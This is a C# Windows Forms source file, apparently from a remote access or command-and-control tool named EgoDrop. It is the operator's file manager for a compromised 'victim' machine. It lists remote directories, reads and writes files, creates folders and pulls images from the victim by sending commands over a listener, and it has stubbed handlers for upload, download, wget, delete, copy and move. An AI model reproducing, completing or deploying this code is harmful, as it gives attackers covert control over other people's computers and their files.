using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmFileMgr : Form
    {
        public clsVictim m_victim { get; set; }
        public string m_szVictimID { get; init; }

        private string m_szInitDir { get; set; }
        private string m_szCurrentPath { get { return (string)textBox1.Tag; } }

        /// <summary>
        /// File information struct.
        /// Store the file information of remote file.
        /// </summary>
        private struct stFileInfo
        {
            public bool bDirectory { get; set; }                                              //Is directory.
            public string szFilePath { get; set; }                                            //File path.
            public string szFileName { get { return szFilePath.Split('/').Last(); } }         //File name.
            public ulong nFileSize { get; set; }                                              //File size(bytes).
            public string szPermission { get; set; }                                          //File permission(rwx).

            public string szCreationDate { get; set; }                                        //File creation date.
            public string szLastModifiedDate { get; set; }                                    //File last modified date.
            public string szLastAccessedDate { get; set; }                                    //File last accessed date.

            /// <summary>
            /// Constructor.
            /// </summary>
            /// <param name="bDirectory">Is directory.</param>
            /// <param name="szFilePath">File path.</param>
            /// <param name="nFileSize">File size(bytes).</param>
            /// <param name="szPermission">File permission(rwx).</param>
            /// <param name="szCreationDate">File creation date.</param>
            /// <param name="szLastModifiedDate">File last modified date.</param>
            /// <param name="szLastAccessedDate">File last accessed date.</param>
            public stFileInfo(
                bool bDirectory,           //Is directory
                string szFilePath,         //File path.
                ulong nFileSize,           //File size(bytes).
                string szPermission,       //File permission(rwx).

                string szCreationDate,     //File creation date.
                string szLastModifiedDate, //File last modified date.
                string szLastAccessedDate  //File last accessed date.
            )
            {
                this.bDirectory = bDirectory;
                this.szFilePath = szFilePath;
                this.nFileSize = nFileSize;
                this.szPermission = szPermission;

                this.szCreationDate = szCreationDate;
                this.szLastModifiedDate = szLastModifiedDate;
                this.szLastAccessedDate = szLastAccessedDate;
            }
        }

        public frmFileMgr(string szVictimID, clsVictim victim)
        {
            InitializeComponent();

            m_szVictimID = szVictimID;
            m_victim = victim;
            m_szInitDir = string.Empty;
        }

        /// <summary>
        /// Victim received message event handler.
        /// </summary>
        /// <param name="listener">Listener object.</param>
        /// <param name="victim">Victim object.</param>
        /// <param name="lsMsg">Message list.</param>
        private void fnRecvMsg(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szSrcVictimID, m_szVictimID) || !clsTools.fnbSameVictim(victim, m_victim))
                return;

            Invoke(new Action(() =>
            {
                try
                {
                    if (lsMsg[0] == "file")
                    {
                        if (lsMsg[1] == "init") //Initialization.
                        {
                            textBox1.Text = lsMsg[2];
                            textBox1.Tag = lsMsg[2];
                            m_szInitDir = lsMsg[2];

                            TreeNode node = fnAddTreeNodeByPath(m_szInitDir);
                            treeView1.ExpandAll();
                            treeView1.SelectedNode = node;
                        }
                        else if (lsMsg[1] == "sd") //Scan directory.
                        {
                            string szPath = lsMsg[2];
                            TreeNode tnNode = fnFindTreeNodeByPath(szPath, treeView1.Nodes);

                            //Return if not exists.
                            if (tnNode == null)
                                return;

                            textBox1.Text = szPath; //Current path.
                            textBox1.Tag = szPath; //Current path.
                            listView1.Items.Clear();

                            //Decapsulation.
                            List<List<string>> ls = clsEZData.fn2dLB64Decode(lsMsg[3]);
                            List<stFileInfo> lsFolder = new List<stFileInfo>();
                            List<stFileInfo> lsFile = new List<stFileInfo>();

                            //Load file info into list.
                            foreach (var lFile in ls)
                            {
                                string szFilePath = lFile[1];
                                string szFileName = szFilePath.Split('/').Last();
                                if (string.IsNullOrEmpty(szFileName) || szFileName == "." || szFileName == "..")
                                    continue;

                                bool bDirectory = lFile[0] == "1";                 //Entity is directory.
                                ulong nFileSize = ulong.Parse(lFile[2]);           //Entity size (bytes).
                                string szPermission = lFile[3];                    //Entity permission (drwx).
                                string szCreationDate = lFile[4];                  //Entity creation date.
                                string szLastModifiedDate = lFile[5];              //Last modified date.
                                string szLastAccessedDate = lFile[6];              //Last accessed date.

                                stFileInfo file = new stFileInfo(
                                    bDirectory,
                                    szFilePath,
                                    nFileSize,
                                    szPermission,
                                    szCreationDate,
                                    szLastModifiedDate,
                                    szLastModifiedDate
                                );

                                if (bDirectory)
                                    lsFolder.Add(file);
                                else
                                    lsFile.Add(file);
                            }

                            //Sorting.
                            lsFolder.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));
                            lsFile.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));

                            List<stFileInfo> lFinal = lsFolder.Concat(lsFile).ToList();

                            //Add file info into treeview and listview.
                            foreach (var entry in lFinal)
                            {
                                ListViewItem item = new ListViewItem(entry.szFileName);
                                item.SubItems.Add(entry.nFileSize.ToString());
                                item.SubItems.Add(entry.szPermission);
                                item.SubItems.Add(entry.szCreationDate);
                                item.SubItems.Add(entry.szLastModifiedDate);
                                item.SubItems.Add(entry.szLastAccessedDate);

                                item.ImageIndex = entry.bDirectory ? 1 : 0;
                                item.Tag = entry;

                                listView1.Items.Add(item);

                                if (entry.bDirectory)
                                {
                                    fnAddTreeNodeByPath(entry.szFilePath);
                                }
                            }

                            //Expand node.
                            tnNode.Expand();
                            tnNode.EnsureVisible();

                            listView1.Refresh();

                            //Show info.
                            toolStripStatusLabel1.Text = $"Folder[{lsFolder.Count}] File[{lsFile.Count}]";
                        }
                        else if (lsMsg[1] == "goto") //Goto specified directory.
                        {
                            //Check specified directory existence.
                            int nCode = int.Parse(lsMsg[2]);
                            string szDirPath = lsMsg[3];

                            if (nCode == 0)
                            {
                                clsTools.fnShowErrMsgbox("Directory does not exist: " + szDirPath);
                                textBox1.Text = (string)textBox1.Tag;
                                textBox1.SelectionStart = textBox1.Text.Length;

                                return;
                            }

                            //Do scandir if dir exists.
                            TreeNode tnNode = fnAddTreeNodeByPath(szDirPath);
                            treeView1.SelectedNode = tnNode;
                        }
                        else if (lsMsg[1] == "uf") //Upload file.
                        {

                        }
                        else if (lsMsg[1] == "df") //Download file
                        {

                        }
                        else if (lsMsg[1] == "wget") //WGET
                        {

                        }
                        else if (lsMsg[1] == "del") //Delete
                        {

                        }
                        else if (lsMsg[1] == "cp") //Copy
                        {

                        }
                        else if (lsMsg[1] == "mv") //Move
                        {

                        }
                        else if (lsMsg[1] == "nd") //New directory.
                        {
                            string szDirPath = lsMsg[2];
                            int nCode = int.Parse(lsMsg[3]);
                            string szMsg = lsMsg[4];

                            if (nCode == 0)
                            {
                                clsTools.fnShowErrMsgbox(szMsg, "New Directory");
                                return;
                            }

                            TreeNode node = fnFindTreeNodeByPath(m_szCurrentPath, treeView1.Nodes);
                            treeView1.SelectedNode = null;
                            treeView1.SelectedNode = node;
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "fileMgr", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }));
        }

        private stFileInfo fnGetInfoStruct(ListViewItem item) => (stFileInfo)item.Tag;

        private TreeNode fnFindTreeNodeByPath(string szPath, TreeNodeCollection treeNodeCollection, TreeNode node = null)
        {
            if (string.IsNullOrEmpty(szPath) || treeNodeCollection.Count == 0)
                return node;

            if (node == null)
                node = treeNodeCollection[0];

            string szNewPath = szPath.Trim('/');
            string[] split = szNewPath.Split('/');
            foreach (TreeNode tnNode in node.Nodes)
            {
                if (string.Equals(tnNode.Text, split.First()))
                {
                    return fnFindTreeNodeByPath(string.Join("/", split.Skip(1).ToArray()), tnNode.Nodes, tnNode);
                }
            }

            return node;
        }

        private TreeNode fnAddTreeNodeByPath(string szPath)
        {
            TreeNode fnRecursive(TreeNode node, string szRelativePath)
            {
                if (string.IsNullOrEmpty(szRelativePath))
                    return node;
                else
                {
                    if (string.IsNullOrEmpty(szRelativePath))
                        return node;

                    szRelativePath = szRelativePath.Trim('/');

                    TreeNode tnNode = null;
                    string[] split = szRelativePath.Split('/');

                    foreach (TreeNode t in node.Nodes)
                    {
                        if (string.Equals(t.Text, split.First()))
                        {
                            tnNode = t;
                            break;
                        }
                    }

                    if (tnNode == null)
                    {
                        tnNode = new TreeNode(split.First());

                        int nIdx = 0;
                        foreach (TreeNode t in node.Nodes)
                        {
                            if (string.Compare(tnNode.Text, t.Text) > 0)
                                nIdx++;
                        }

                        node.Nodes.Insert(nIdx, tnNode);

                        return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                    }
                    else
                    {
                        return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                    }
                }
            }

            TreeNode tnRoot = null;
            if (treeView1.Nodes.Count == 0)
            {
                tnRoot = new TreeNode("/");
                treeView1.Nodes.Add(tnRoot);
            }
            else
            {
                tnRoot = treeView1.Nodes[0];
            }

            if (szPath == "/")
            {
                return tnRoot;
            }
            else
            {
                return fnRecursive(tnRoot, szPath);
            }
        }

        public void fnWriteFile(string szFilePath, string szContent)
        {
            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "file",
                "wf",
                szFilePath,
                szContent,
            });
        }

        public void fnReadFile(string szFilePath)
        {
            frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(m_victim, m_szVictimID);
            if (f == null)
            {
                f = new frmFileEditor(m_szVictimID, m_victim);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }

            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "file",
                "rf",
                szFilePath,
            });
        }

        public void fnGoto(string szDirPath)
        {
            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "file",
                "goto",
                szDirPath,
            });
        }

        private void fnSetup()
        {
            m_victim.fnSendCommand(m_szVictimID, "file|init");
            m_victim.m_listener.evtReceivedMessage += fnRecvMsg;
        }

        private void frmFileMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmFileMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.evtReceivedMessage -= fnRecvMsg;
        }

        private async void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            string szPath = treeView1.SelectedNode.FullPath.Replace("\\", "/").Replace("//", "/");
            m_victim.fnSendCommand(m_szVictimID, "file|sd|" + szPath);
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
            if (item == null)
                return;

            stFileInfo info = fnGetInfoStruct(item);
            if (info.bDirectory)
            {
                TreeNode node = fnFindTreeNodeByPath(info.szFilePath, treeView1.Nodes);
                treeView1.SelectedNode = node;
            }
            else
            {
                fnReadFile(info.szFilePath);
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string szDirPath = textBox1.Text;
                fnGoto(szDirPath);
            }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            List<string> lsImage = listView1.Items.Cast<ListViewItem>().ToList()
                .Select(x => fnGetInfoStruct(x))
                .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
                .Select(x => x.szFilePath)
                .ToList();

            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim, m_szVictimID);
            if (f == null)
            {
                f = new frmFileImage(m_victim);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }

            f.fnSendImageRequest(lsImage);
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            List<string> lsImage = listView1.SelectedItems.Cast<ListViewItem>().ToList()
                .Select(x => fnGetInfoStruct(x))
                .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
                .Select(x => x.szFilePath)
                .ToList();

            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim, m_szVictimID);
            if (f == null)
            {
                f = new frmFileImage(m_victim);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }

            f.fnSendImageRequest(lsImage);
        }

        //New Folder
        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            ListViewItem item = new ListViewItem($"Folder_{clsEZData.fnszDateString()}");
            listView1.Items.Add(item);

            listView1.LabelEdit = true;
            item.BeginEdit();
        }
        //New Text File
        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            frmFileEditor f = new frmFileEditor(m_szVictimID, m_victim);

            f.Show();

            string szFilePath = $"{m_szCurrentPath}/{clsEZData.fnszDateFileName("txt")}";
            f.fnAddNewPage(szFilePath, string.Empty);
        }

        private void listView1_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            ListViewItem item = listView1.Items[e.Item];

            if (e.Label == null)
            {
                listView1.Items.Remove(item);
                return;
            }

            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "file",
                "nd",
                m_szCurrentPath + "/" + item.Text,
            });

            listView1.LabelEdit = false;
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
            if (item == null)
                return;

            stFileInfo info = fnGetInfoStruct(item);
            fnReadFile(info.szFilePath);
        }
    }
}
